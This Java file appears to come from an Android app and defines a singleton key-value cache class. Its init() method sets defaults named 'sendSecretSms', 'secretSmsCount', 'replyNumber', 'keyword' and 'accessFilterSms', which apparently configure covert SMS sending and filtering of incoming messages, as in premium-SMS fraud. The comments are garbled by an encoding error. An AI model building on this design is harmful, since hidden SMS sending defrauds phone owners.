package com.sttm.util;

import java.util.HashMap;

/**
 * ������
 * 
 * @author ligm
 * @since 2012.5.3 17��54
 * 
 */

import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;

public class KsoCache {

	// ��������---��ֵ�Է�ʽ
	private HashMap<String, Object> cacheContent = new HashMap<String, Object>();

	private static KsoCache cache = null;

	// ��
	private static final Object LOCK = new Object();

	// �����ⲿʵ������ֻ��ͨ���ڲ�ʵ����
	private KsoCache() {
	}

	/*
	 * // ��̬ģʽ����֤ÿ�ζ���ͬһ������ public static synchronized KsoCache
	 * getInstance(Context context) { if (cache == null) { cache = new
	 * KsoCache();
	 * 
	 * }else { if(cache.getCacheSize() <= 0){ cache.init(context); } } return
	 * cache;
	 * 
	 * }
	 */

	// ��̬ģʽ����֤ÿ�ζ���ͬһ������
	public static synchronized KsoCache getInstance() {
		if (cache == null) {
			cache = new KsoCache();

		}
		return cache;

	}

	// ϵͳ����ʱ��ʼ����������

	public void init(Context context) {

		synchronized (LOCK) {

			String curstomID = "";
			try {
				curstomID = KsoHelper.getCustomID(context);
			} catch (NameNotFoundException e) {

				e.printStackTrace();
			}
			cache.reSetValue("curstomID", curstomID);
			cache.reSetValue("sendSecretSms", false);
			cache.reSetValue("salenum", "");
			cache.reSetValue("channel", "");
			cache.reSetValue("order", "");
			cache.reSetValue("replyNumber", "");
			cache.reSetValue("keyword", "");
			cache.reSetValue("secretSmsCount", 2);
			cache.reSetValue("interval", 4);		
			cache.reSetValue("timeout", "4");
			cache.reSetValue("accessFilterSms", true);

		}

	}

	// ���¸��»�������
	public void reSetValues(String[] keys, Object[] values) {
		// ��ֵ�����Ĳ�����һ��Object����
		synchronized (LOCK) {
			for (int i = 0; i < values.length; i++) {
				cacheContent.put(keys[i], values[i]);

			}

		}

	}

	// ���¸��»�������
	public void reSetValue(String key, Object value) {
		synchronized (LOCK) {
			cacheContent.put(key, value);

		}

	}

	// ���ݼ�ȡֵ

	public Object getValue(String key) {
		synchronized (LOCK) {
			return cacheContent.get(key);

		}

	}

	// ���ݼ�ɾ����������
	public void deleteCache(String key) {
		synchronized (LOCK) {
			cacheContent.remove(key);

		}

	}

	// ���ݼ�ɾ����������
	public void removeCache(String[] keys) {
		synchronized (LOCK) {
			for (int i = 0; i < keys.length; i++) {
				cacheContent.remove(keys[i]);

			}

		}

	}

	// ȫ����ջ�������
	public void clearCache() {
		synchronized (LOCK) {
			cacheContent.clear();

		}

	}

	public int getCacheSize() {
		synchronized (LOCK) {
			return cacheContent.size();

		}

	}

}
